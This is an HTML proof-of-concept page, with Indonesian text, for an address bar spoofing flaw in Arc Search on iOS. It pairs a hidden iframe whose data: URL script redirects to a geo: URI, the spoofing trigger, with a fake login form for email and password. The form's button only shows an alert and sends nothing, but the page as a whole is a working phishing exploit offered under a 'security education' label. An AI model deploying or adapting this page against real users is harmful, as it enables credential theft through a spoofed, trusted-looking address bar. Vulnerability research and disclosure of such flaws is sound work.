<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC CVE-2025-14812 - Address Bar Spoofing</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .warning-box {
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .phishing-area {
            border: 2px solid #007aff;
            border-radius: 12px;
            padding: 25px;
            background: #f9f9f9;
        }
        input {
            width: 80%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        button {
            background-color: #007aff;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
        }
        iframe {
            display: none; /* Sembunyikan iframe pemicu */
        }
    </style>
</head>
<body>

    <div class="warning-box">
        <strong>Edukasi Keamanan:</strong><br>
        Jika Anda membuka file ini di Arc Search iOS (versi rentan), bilah alamat akan berubah menjadi domain tempat iframe ini di-host, namun konten ini akan tetap terlihat.
    </div>

    <h1>Login ke Layanan Aman</h1>
    <p>Silakan masukkan kredensial Anda untuk melanjutkan.</p>

    <div class="phishing-area">
        <input type="text" placeholder="Email atau Username" id="user">
        <input type="password" placeholder="Password" id="pass">
        <br>
        <button onclick="alert('Data terkirim ke penyerang!')">Masuk</button>
    </div>

    <iframe src="data:text/html,<html><body><script>window.location.href='geo:0,0?q=London';</script></body></html>"></iframe>

    <script>
        // Opsional: Tambahkan sedikit delay agar user sempat melihat halaman asli 
        // sebelum address bar berubah.
        console.log("PoC diaktifkan...");
    </script>

</body>
</html>
